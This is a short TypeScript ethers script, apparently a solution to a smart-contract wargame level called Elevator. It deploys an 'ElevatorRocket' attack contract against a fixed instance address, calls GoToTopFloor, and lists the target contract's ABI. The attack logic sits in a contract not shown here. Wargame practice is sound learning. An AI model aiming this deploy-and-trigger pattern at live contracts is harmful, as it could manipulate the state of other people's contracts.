// Runtime Environment's members available in the global scope.
import { BigNumber, ethers, Signer } from "ethers";
import { Interface } from "ethers/lib/utils";
import { getSigner } from "./signer";
import { ElevatorRocket__factory } from "../typechain";


async function main() {
  const instanceAddress = "0x293c413790FA3853e43cba782B052Abc9c9c4a09";
  const signer = getSigner();
  console.log("deploy attack contract");
  const ct = await (new ElevatorRocket__factory(signer)).deploy(instanceAddress);
  await ct.deployed();
  console.log("address deployed:", ct.address);
  await ct.GoToTopFloor();
}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });

const abi = [
  {
    "inputs": [],
    "name": "floor",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0x40695363"
  },
  {
    "inputs": [
      {
        "internalType": "uint256",
        "name": "_floor",
        "type": "uint256"
      }
    ],
    "name": "goTo",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0xed9a7134"
  },
  {
    "inputs": [],
    "name": "top",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xfe6dcdba"
  }
]